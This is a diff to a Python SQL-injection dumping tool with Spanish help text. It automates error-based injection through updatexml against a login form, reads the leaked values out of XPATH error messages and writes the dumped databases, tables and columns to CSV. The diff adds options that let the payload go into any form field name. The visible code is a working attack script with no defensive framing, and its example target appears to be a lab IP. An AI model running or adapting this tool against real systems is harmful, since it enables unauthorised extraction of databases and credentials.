@@ -32,10 +32,14 @@ from urllib.parse import urlparse
 parser = argparse.ArgumentParser(description="Dump SQL vía SQLi (updatexml), formato estructurado y exportación CSV.")
 parser.add_argument("--url", required=True, help="URL del formulario vulnerable, ej: http://10.10.224.12/login")
 parser.add_argument("--max", type=int, default=10, help="Máximo de iteraciones por nivel (default: 10)")
+parser.add_argument("--userfield", default="username", help="Nombre del campo de usuario en el formulario (default: username)")
+parser.add_argument("--passfield", default="password", help="Nombre del campo de contraseña en el formulario (default: password)")
 args = parser.parse_args()
 
 url = args.url
 max_enum = args.max
+user_field = args.userfield
+pass_field = args.passfield
 dump = {}
 
 headers = {
@@ -48,7 +52,8 @@ def sqli_payload(query):
 
 def extract(query):
   try:
-    r = requests.post(url, data={"username": sqli_payload(query), "password": "x"}, headers=headers, timeout=5)
+    data = {user_field: sqli_payload(query), pass_field: "x"}
+    r = requests.post(url, data=data, headers=headers, timeout=5)
     if "XPATH syntax error" in r.text:
       start = r.text.find("~")
       end = r.text.find("~", start + 1)
@@ -118,3 +123,4 @@ with open(csv_file, "w", newline='', encoding="utf-8") as f:
           writer.writerow([db, table, column, idx, val])
 
 print(f"\n Dump guardado en CSV: {csv_file}")
+
